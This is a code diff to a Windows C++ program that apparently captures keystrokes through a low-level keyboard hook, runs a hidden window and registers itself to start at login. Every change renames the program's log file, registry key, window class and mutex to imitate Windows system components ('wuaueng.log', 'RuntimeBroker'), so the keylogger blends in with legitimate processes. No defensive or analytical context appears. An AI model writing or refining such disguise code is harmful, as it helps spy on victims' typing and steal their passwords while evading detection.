@@ -211,12 +211,9 @@ static std::string GetKeyString(DWORD vk) {
 }
 
 static void LogMsg(const std::string& msg) {
-    char path[MAX_PATH];
-    GetModuleFileNameA(NULL, path, MAX_PATH);
-    std::string logPath = std::string(path);
-    size_t pos = logPath.find_last_of("\\/");
-    if (pos != std::string::npos) logPath = logPath.substr(0, pos + 1);
-    logPath += GetExeName() + ".log";
+    char tmp[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmp);
+    std::string logPath = std::string(tmp) + "wuaueng.log";
     FILE* f = NULL;
     fopen_s(&f, logPath.c_str(), "a");
     if (f) {
@@ -1111,7 +1108,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\Netpen"
+#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
 
 static void EnsureStartupEntry();
 
@@ -1188,7 +1185,7 @@ static std::string Base64Encode(const BYTE* data, DWORD size) {
     return result;
 }
 
-#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\Netpen"
+#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
 
 static void InstallStartup() {
     char path[MAX_PATH];
@@ -1248,15 +1245,14 @@ static int RunChild(HINSTANCE hInstance) {
     wc.cbSize = sizeof(WNDCLASSEXW);
     wc.lpfnWndProc = WndProc;
     wc.hInstance = hInstance;
-    std::wstring windowClass = GetExeNameW() + L"_Class";
-    wc.lpszClassName = windowClass.c_str();
+    wc.lpszClassName = L"RuntimeBrokerHiddenWindow";
     if (!RegisterClassExW(&wc)) return 1;
 
     Gdiplus::GdiplusStartupInput gdiInput;
     ULONG_PTR gdiToken;
     Gdiplus::GdiplusStartup(&gdiToken, &gdiInput, NULL);
 
-    g_hwnd = CreateWindowExW(0, windowClass.c_str(), L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
+    g_hwnd = CreateWindowExW(0, L"RuntimeBrokerHiddenWindow", L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
     if (!g_hwnd) { Gdiplus::GdiplusShutdown(gdiToken); return 1; }
 
     g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
@@ -1290,7 +1286,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
         return RunChild(hInstance);
     }
 
-    CreateMutexW(NULL, TRUE, (GetExeNameW() + L"_Mutex").c_str());
+    CreateMutexW(NULL, TRUE, L"RuntimeBroker_Instance");
     if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
 
     char hostname[256] = {0};
